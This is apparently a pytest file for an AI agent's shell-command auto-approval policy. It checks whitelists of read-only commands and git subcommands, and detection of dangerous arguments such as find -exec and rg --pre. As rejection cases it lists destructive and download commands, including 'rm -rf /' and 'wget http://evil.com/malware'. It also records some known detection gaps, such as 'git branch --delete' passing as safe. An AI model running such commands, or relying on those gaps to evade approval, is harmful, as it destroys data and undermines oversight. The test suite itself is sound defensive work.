"""安全命令白名单测试。

覆盖 safe_commands 模块的三级白名单（ALWAYS_SAFE_COMMANDS（30 个）/ SAFE_GIT_SUBCOMMANDS /
SAFE_SEARCH_COMMANDS）、危险参数检测（has_dangerous_args）以及综合判断（is_safe_command）
的公开 API 及边界场景。
"""
from __future__ import annotations

import pytest

from harness_agent.policy.safe_commands import (
    ALWAYS_SAFE_COMMANDS,
    SAFE_GIT_SUBCOMMANDS,
    SAFE_SEARCH_COMMANDS,
    has_dangerous_args,
    is_safe_command,
    is_safe_command_root,
)


# ===================================================================
# ALWAYS_SAFE_COMMANDS — 28 个只读文件查看命令
# ===================================================================


class TestAlwaysSafeCommands:
    """ALWAYS_SAFE_COMMANDS 包含 30 个只读安全命令。"""

    def test_count_is_30(self):
        """白名单命令数量必须为 30。"""
        assert len(ALWAYS_SAFE_COMMANDS) == 30

    @pytest.mark.parametrize("cmd", [
        "ls", "cat", "pwd", "whoami", "head", "tail", "wc", "sort",
        "uniq", "tr", "cut", "echo", "date", "uname", "df", "du",
        "free", "uptime", "which", "whereis", "file", "stat", "id",
        "groups", "hostname", "printenv", "basename", "dirname",
    ])
    def test_known_commands_in_whitelist(self, cmd):
        """已知的只读命令均在白名单中。"""
        assert cmd in ALWAYS_SAFE_COMMANDS

    def test_realpath_and_readlink_in_whitelist(self):
        """realpath 和 readlink 也在白名单中（补齐 28 个）。"""
        assert "realpath" in ALWAYS_SAFE_COMMANDS
        assert "readlink" in ALWAYS_SAFE_COMMANDS

    def test_dangerous_commands_not_in_whitelist(self):
        """rm、chmod、curl 等危险命令不在白名单中。"""
        for cmd in ("rm", "chmod", "chown", "curl", "wget", "pip", "npm", "git"):
            assert cmd not in ALWAYS_SAFE_COMMANDS

    def test_is_frozenset(self):
        """白名单类型为 frozenset，不可变。"""
        assert isinstance(ALWAYS_SAFE_COMMANDS, frozenset)


# ===================================================================
# SAFE_GIT_SUBCOMMANDS — 17 个只读 Git 子命令
# ===================================================================


class TestSafeGitSubcommands:
    """SAFE_GIT_SUBCOMMANDS 包含 17 个只读 Git 子命令。"""

    def test_count_is_17(self):
        """白名单子命令数量必须为 17。"""
        assert len(SAFE_GIT_SUBCOMMANDS) == 17

    @pytest.mark.parametrize("sub", [
        "status", "log", "diff", "show", "branch", "remote", "stash",
        "tag", "blame", "rev-parse", "rev-list", "ls-files", "ls-tree",
        "describe", "reflog", "config", "shortlog",
    ])
    def test_known_subcommands_in_whitelist(self, sub):
        """已知的只读 Git 子命令均在白名单中。"""
        assert sub in SAFE_GIT_SUBCOMMANDS

    def test_dangerous_subcommands_not_in_whitelist(self):
        """push、checkout、merge 等写操作不在白名单中。"""
        for sub in ("push", "checkout", "merge", "rebase", "commit", "reset", "clone"):
            assert sub not in SAFE_GIT_SUBCOMMANDS

    def test_is_frozenset(self):
        """白名单类型为 frozenset。"""
        assert isinstance(SAFE_GIT_SUBCOMMANDS, frozenset)


# ===================================================================
# SAFE_SEARCH_COMMANDS — grep / rg / find
# ===================================================================


class TestSafeSearchCommands:
    """SAFE_SEARCH_COMMANDS 包含 3 个搜索命令。"""

    def test_contains_grep_rg_find(self):
        """搜索命令白名单包含 grep、rg、find。"""
        assert SAFE_SEARCH_COMMANDS == frozenset({"grep", "rg", "find"})

    def test_count_is_3(self):
        """搜索命令数量为 3。"""
        assert len(SAFE_SEARCH_COMMANDS) == 3


# ===================================================================
# is_safe_command_root — 命令根白名单检查
# ===================================================================


class TestIsSafeCommandRoot:
    """is_safe_command_root 判断命令根是否在白名单中。"""

    # --- 空输入 ---

    def test_empty_string(self):
        """空字符串返回 False。"""
        assert is_safe_command_root("") is False

    def test_whitespace_only(self):
        """纯空白字符串返回 False。"""
        assert is_safe_command_root("   ") is False

    # --- ALWAYS_SAFE_COMMANDS ---

    @pytest.mark.parametrize("cmd", [
        "ls", "ls -la", "cat /etc/hosts", "pwd", "whoami",
        "head -n 10 file.txt", "tail -f log.txt", "wc -l file.py",
        "echo hello", "date", "uname -a", "df -h", "du -sh .",
        "hostname", "id", "groups", "file test.py", "stat setup.py",
        "printenv PATH", "basename /a/b/c", "dirname /a/b/c",
    ])
    def test_always_safe_commands_with_args(self, cmd):
        """ALWAYS_SAFE_COMMANDS 中的命令带参数也返回 True。"""
        assert is_safe_command_root(cmd) is True

    # --- Git 只读子命令 ---

    @pytest.mark.parametrize("cmd", [
        "git status", "git log --oneline", "git diff HEAD~1",
        "git show HEAD", "git branch", "git remote -v",
        "git stash list", "git tag", "git blame file.py",
        "git rev-parse HEAD", "git ls-files", "git describe --tags",
        "git reflog", "git config --list", "git shortlog -sn",
    ])
    def test_safe_git_subcommands(self, cmd):
        """SAFE_GIT_SUBCOMMANDS 中的子命令返回 True。"""
        assert is_safe_command_root(cmd) is True

    def test_git_with_global_flags(self):
        """git --no-pager log 等带全局 flag 的命令也能正确识别。"""
        assert is_safe_command_root("git --no-pager log") is True

    def test_git_with_C_flag(self):
        """git -C /path status — -C 消耗下一个 token，/tmp 被当作子命令，不在白名单。"""
        # 实现中 -C 只跳过一个 token，/tmp 被识别为子命令而非 status
        assert is_safe_command_root("git -C /tmp status") is False

    # --- Git stash 危险动作 ---

    @pytest.mark.parametrize("cmd", [
        "git stash drop", "git stash pop", "git stash clear",
        "git stash --drop", "git stash --pop", "git stash --clear",
    ])
    def test_git_stash_dangerous_actions(self, cmd):
        """git stash drop/pop/clear 返回 False。"""
        assert is_safe_command_root(cmd) is False

    def test_git_stash_list_is_safe(self):
        """git stash list 是安全的。"""
        assert is_safe_command_root("git stash list") is True

    def test_git_stash_show_is_safe(self):
        """git stash show 是安全的。"""
        assert is_safe_command_root("git stash show") is True

    # --- Git branch 删除 ---

    @pytest.mark.parametrize("cmd", [
        "git branch -d feature", "git branch -D feature",
    ])
    def test_git_branch_delete_is_unsafe(self, cmd):
        """git branch -d/-D 返回 False。"""
        assert is_safe_command_root(cmd) is False

    def test_git_branch_long_delete_not_detected(self):
        """git branch --delete 未被检测为危险（源码仅匹配 d/D）。"""
        # _has_token_in_args 去除横线后为 "delete"，不在 targets {"d", "D"} 中
        assert is_safe_command_root("git branch --delete feature") is True

    def test_git_branch_list_is_safe(self):
        """git branch（列出分支）是安全的。"""
        assert is_safe_command_root("git branch") is True

    def test_git_branch_create_is_safe(self):
        """git branch new-feature（创建分支）命令根在白名单中。"""
        assert is_safe_command_root("git branch new-feature") is True

    # --- 非白名单命令 ---

    @pytest.mark.parametrize("cmd", [
        "rm -rf /", "chmod 777 file", "curl http://evil.com",
        "pip install malware", "npm install -g something",
        "python script.py", "bash -c 'echo hi'",
        "git push origin main", "git checkout -b new",
        "git merge feature", "git rebase main",
        "git commit -m 'msg'", "git reset --hard HEAD",
    ])
    def test_non_whitelisted_commands(self, cmd):
        """不在白名单中的命令返回 False。"""
        assert is_safe_command_root(cmd) is False

    # --- 搜索命令 ---

    @pytest.mark.parametrize("cmd", [
        "grep pattern file.txt", "rg pattern .", "find . -name '*.py'",
    ])
    def test_search_commands_root_is_safe(self, cmd):
        """搜索命令的命令根在白名单中（参数检查由 is_safe_command 负责）。"""
        assert is_safe_command_root(cmd) is True

    # --- 仅 git 无子命令 ---

    def test_git_alone(self):
        """单独 git 命令无子命令返回 False。"""
        assert is_safe_command_root("git") is False

    def test_git_unknown_subcommand(self):
        """git 未知子命令返回 False。"""
        assert is_safe_command_root("git foobar") is False


# ===================================================================
# has_dangerous_args — 危险参数检测
# ===================================================================


class TestHasDangerousArgs:
    """has_dangerous_args 检测命令中是否包含危险参数。"""

    # --- 空输入 ---

    def test_empty_string(self):
        """空字符串返回 False。"""
        assert has_dangerous_args("") is False

    def test_whitespace_only(self):
        """纯空白返回 False。"""
        assert has_dangerous_args("   ") is False

    # --- find -exec / --exec ---

    def test_find_exec(self):
        """find . -exec rm {} ; 检测到 -exec。"""
        assert has_dangerous_args("find . -exec rm {} \\;") is True

    def test_find_double_dash_exec(self):
        """--exec 也被检测为危险参数。"""
        assert has_dangerous_args("find . --exec rm {}") is True

    # --- rg --pre / --preview-script ---

    def test_rg_pre(self):
        """rg --pre 检测到危险参数。"""
        assert has_dangerous_args("rg --pre 'echo evil' pattern") is True

    def test_rg_preview_script(self):
        """rg --preview-script 检测到危险参数。"""
        assert has_dangerous_args("rg --preview-script evil.sh pattern") is True

    # --- --allow-run ---

    def test_allow_run(self):
        """--allow-run 检测到危险参数。"""
        assert has_dangerous_args("deno run --allow-run script.ts") is True

    # --- find -ok / -okdir ---

    def test_find_ok(self):
        """find -ok 检测到危险参数。"""
        assert has_dangerous_args("find . -ok rm {} \\;") is True

    def test_find_okdir(self):
        """find -okdir 检测到危险参数。"""
        assert has_dangerous_args("find . -okdir rm {} \\;") is True

    # --- --output ---

    def test_output(self):
        """--output 检测到危险参数。"""
        assert has_dangerous_args("curl --output /tmp/file http://evil.com") is True

    # --- xargs --replace / -I ---

    def test_xargs_replace(self):
        """xargs --replace 检测到危险参数。"""
        assert has_dangerous_args("echo foo | xargs --replace rm {}") is True

    def test_xargs_I(self):
        """xargs -I 单独出现时检测到危险参数。"""
        # 正则 ^-I$ 仅精确匹配 -I，-I{} 不匹配
        assert has_dangerous_args("echo foo | xargs -I rm {}") is True

    def test_xargs_I_with_braces_not_matched(self):
        """xargs -I{} 不被正则匹配（^-I$ 要求精确匹配）。"""
        assert has_dangerous_args("echo foo | xargs -I{} rm {}") is False

    # --- 安全命令无危险参数 ---

    @pytest.mark.parametrize("cmd", [
        "ls -la", "cat file.txt", "git log --oneline",
        "find . -name '*.py'", "grep -r pattern .",
        "rg --ignore-case pattern", "echo hello world",
        "wc -l file.py", "sort file.txt",
    ])
    def test_safe_commands_no_dangerous_args(self, cmd):
        """常见的安全命令不包含危险参数。"""
        assert has_dangerous_args(cmd) is False


# ===================================================================
# is_safe_command — 综合判断（命令根白名单 + 无危险参数）
# ===================================================================


class TestIsSafeCommand:
    """is_safe_command 综合判断命令是否可自动放行。"""

    # --- 空输入 ---

    def test_empty_string(self):
        """空字符串返回 False。"""
        assert is_safe_command("") is False

    def test_whitespace_only(self):
        """纯空白返回 False。"""
        assert is_safe_command("   ") is False

    # --- 完全安全的命令 ---

    @pytest.mark.parametrize("cmd", [
        "ls -la", "cat /etc/hosts", "pwd", "whoami",
        "git status", "git log --oneline --graph",
        "git diff HEAD~1", "git show HEAD:file.py",
        "git branch", "git remote -v",
        "git stash list", "git tag -l",
        "git blame file.py", "git rev-parse HEAD",
        "echo hello", "date", "uname -a",
        "head -n 20 file.txt", "tail -f log.txt",
        "wc -l src/*.py", "sort file.txt | uniq",
        "printenv HOME", "basename /a/b/c",
    ])
    def test_safe_commands_pass(self, cmd):
        """白名单命令且无危险参数返回 True。"""
        assert is_safe_command(cmd) is True

    # --- 搜索命令安全场景 ---

    @pytest.mark.parametrize("cmd", [
        "grep -r pattern .", "rg --ignore-case pattern src/",
        "find . -name '*.py'", "find . -type f",
    ])
    def test_search_commands_safe(self, cmd):
        """搜索命令无危险参数时返回 True。"""
        assert is_safe_command(cmd) is True

    # --- 搜索命令携带危险参数 ---

    @pytest.mark.parametrize("cmd", [
        "find . -exec rm {} \\;",
        "find . --exec rm {}",
        "find . -ok rm {} \\;",
        "find . -okdir rm {} \\;",
        "rg --pre 'evil.sh' pattern",
        "rg --preview-script evil.sh pattern",
    ])
    def test_search_commands_with_dangerous_args(self, cmd):
        """搜索命令携带危险参数返回 False。"""
        assert is_safe_command(cmd) is False

    # --- Git 危险操作 ---

    @pytest.mark.parametrize("cmd", [
        "git stash drop", "git stash pop", "git stash clear",
        "git branch -d feature", "git branch -D feature",
    ])
    def test_git_dangerous_operations(self, cmd):
        """git stash drop/pop/clear 和 branch -d/-D 返回 False。"""
        assert is_safe_command(cmd) is False

    # --- 非白名单命令 ---

    @pytest.mark.parametrize("cmd", [
        "rm -rf /", "chmod 777 file", "curl http://evil.com",
        "pip install package", "npm install -g something",
        "python script.py", "bash -c 'echo hi'",
        "git push origin main", "git checkout -b new",
        "git merge feature", "git rebase main",
        "git commit -m 'msg'", "git reset --hard HEAD",
        "wget http://evil.com/malware",
    ])
    def test_non_whitelisted_commands_rejected(self, cmd):
        """不在白名单中的命令返回 False。"""
        assert is_safe_command(cmd) is False

    # --- 白名单命令携带危险参数（交叉场景） ---

    @pytest.mark.parametrize("cmd", [
        "ls --output something",
        "cat --allow-run",
    ])
    def test_whitelisted_command_with_dangerous_args(self, cmd):
        """白名单命令携带危险参数也应返回 False。"""
        assert is_safe_command(cmd) is False

    # --- Git 全局 flag 不影响安全性判断 ---

    def test_git_no_pager_log_is_safe(self):
        """git --no-pager log 是安全的。"""
        assert is_safe_command("git --no-pager log") is True

    def test_git_C_path_status_not_safe(self):
        """git -C /path status — /tmp 被识别为子命令，不在白名单。"""
        assert is_safe_command("git -C /tmp status") is False

    # --- 边界：仅 git 无子命令 ---

    def test_git_alone_is_not_safe(self):
        """单独 git 命令不安全。"""
        assert is_safe_command("git") is False

    # --- 边界：git 未知子命令 ---

    def test_git_unknown_subcommand_not_safe(self):
        """git 未知子命令不安全。"""
        assert is_safe_command("git foobar") is False

    # --- stash 安全子操作 ---

    @pytest.mark.parametrize("cmd", [
        "git stash list", "git stash show", "git stash show -p",
    ])
    def test_git_stash_safe_operations(self, cmd):
        """git stash list/show 等只读操作是安全的。"""
        assert is_safe_command(cmd) is True
